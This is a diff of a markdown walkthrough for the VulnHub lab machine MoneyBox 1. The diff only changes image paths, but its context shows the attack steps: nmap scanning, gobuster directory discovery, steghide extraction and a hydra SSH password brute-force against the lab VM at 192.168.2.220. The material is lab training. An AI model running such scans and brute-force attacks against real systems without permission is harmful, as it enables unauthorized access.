@@ -3,7 +3,7 @@
 - **Machine:** MoneyBox: 1
 - **Download:** https://www.vulnhub.com/entry/moneybox-1,653/
 
-![](789-1.png)
+![](images/789-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](789-2.png)
+![](images/789-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Run a complete scan to identify open ports, services, operating system details, 
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.220
 ```
 
-![](789-3.png)
+![](images/789-3.png)
 
 ---
 
@@ -77,7 +77,7 @@ Search for hidden directories.
 gobuster dir -u http://192.168.2.220 -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![](789-4.png)
+![](images/789-4.png)
 
 Discovered endpoint:
 
@@ -89,7 +89,7 @@ Discovered endpoint:
 
 Inspect the page source.
 
-![](789-5.png)
+![](images/789-5.png)
 
 A hidden directory is discovered.
 
@@ -99,7 +99,7 @@ Visit:
 
 Inspect its source code.
 
-![](789-6.png)
+![](images/789-6.png)
 
 Recovered secret string:
 
@@ -131,7 +131,7 @@ Download the image.
 get trytofind.jpg
 ```
 
-![](789-7.png)
+![](images/789-7.png)
 
 ---
 
@@ -143,7 +143,7 @@ Extract hidden data from the image using the password recovered earlier.
 steghide extract -sf trytofind.jpg
 ```
 
-![](789-8.png)
+![](images/789-8.png)
 
 A hidden file named **data.txt** is extracted.
 
@@ -153,7 +153,7 @@ Read its contents.
 cat data.txt
 ```
 
-![](789-9.png)
+![](images/789-9.png)
 
 The extracted file provides information about a system user.
 
@@ -167,7 +167,7 @@ Brute-force the SSH password for the discovered user.
 hydra -l renu -P /opt/rockyou.txt ssh://192.168.2.220
 ```
 
-![](789-10.png)
+![](images/789-10.png)
 
 Recovered credentials:
 
@@ -186,7 +186,7 @@ Connect to the target.
 ssh renu@192.168.2.220
 ```
 
-![](789-11.png)
+![](images/789-11.png)
 
 Successfully obtained an interactive SSH shell.
 
